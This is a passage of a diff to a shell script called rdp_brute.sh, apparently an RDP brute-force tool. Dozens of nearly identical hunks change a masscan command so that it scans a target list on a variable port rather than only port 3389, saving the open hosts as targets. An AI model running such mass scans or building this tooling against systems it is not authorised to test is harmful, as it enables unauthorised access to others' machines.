-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16527,7 +16531,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16573,7 +16577,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16619,7 +16623,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16664,7 +16668,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16710,7 +16714,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16756,7 +16760,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16802,7 +16806,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16848,7 +16852,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16894,7 +16898,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16940,7 +16944,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -16986,7 +16990,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17032,7 +17036,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17078,7 +17082,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17124,7 +17128,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17170,7 +17174,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17216,7 +17220,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17262,7 +17266,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17308,7 +17312,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17354,7 +17358,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17398,7 +17402,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17444,7 +17448,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17489,7 +17493,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17535,7 +17539,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17581,7 +17585,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17627,7 +17631,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17673,7 +17677,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17719,7 +17723,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17765,7 +17769,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17811,7 +17815,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17857,7 +17861,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17903,7 +17907,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17949,7 +17953,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -17995,7 +17999,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18041,7 +18045,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18087,7 +18091,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18133,7 +18137,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18179,7 +18183,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18225,7 +18229,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18271,7 +18275,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18317,7 +18321,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18363,7 +18367,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18409,7 +18413,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18455,7 +18459,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18501,7 +18505,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18547,7 +18551,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18591,7 +18595,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18636,7 +18640,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18681,7 +18685,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18726,7 +18730,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18771,7 +18775,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18816,7 +18820,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18861,7 +18865,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18906,7 +18910,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18952,7 +18956,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -18998,7 +19002,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19043,7 +19047,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19088,7 +19092,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19133,7 +19137,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19179,7 +19183,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19224,7 +19228,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19270,7 +19274,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -19316,7 +19320,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
